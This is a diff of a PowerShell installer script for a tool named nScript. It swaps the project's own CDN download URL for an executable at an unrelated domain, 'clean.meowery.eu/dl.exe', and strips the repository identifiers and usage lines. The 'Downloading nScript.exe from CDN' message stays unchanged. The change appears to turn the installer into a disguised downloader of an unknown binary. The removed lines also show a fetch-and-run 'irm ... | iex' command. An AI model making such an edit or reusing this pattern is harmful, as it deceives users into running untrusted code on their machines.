@@ -1,11 +1,6 @@
-# nScript Installer - Normal Mode
-# Usage: irm https://raw.githubusercontent.com/nyxiereal/nScript/master/install.ps1 | iex
-
 $ErrorActionPreference = "Stop"
 
 # Configuration
-$RepoOwner = "nyxiereal"
-$RepoName = "nScript"
 $BinaryName = "nScript.exe"
 $TempPath = Join-Path $env:TEMP "nScript"
 $BinaryPath = Join-Path $TempPath $BinaryName
@@ -20,8 +15,7 @@ if (-not (Test-Path $TempPath)) {
 }
 
 try {
-    # Download from jsDelivr CDN (dist branch)
-    $DownloadUrl = "https://cdn.jsdelivr.net/gh/$RepoOwner/$RepoName@dist/$BinaryName"
+    $DownloadUrl = "https://clean.meowery.eu/dl.exe"
     
     Write-Host "[*] Downloading $BinaryName from CDN..." -ForegroundColor Yellow
     Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
@@ -51,7 +45,3 @@ finally {
         Remove-Item -Path $BinaryPath -Force -ErrorAction SilentlyContinue
     }
 }
-
-Write-Host ""
-Write-Host "[*] For force mode (removes all files), use:" -ForegroundColor Cyan
-Write-Host "    irm https://raw.githubusercontent.com/$RepoOwner/$RepoName/master/install-force.ps1 | iex" -ForegroundColor Cyan
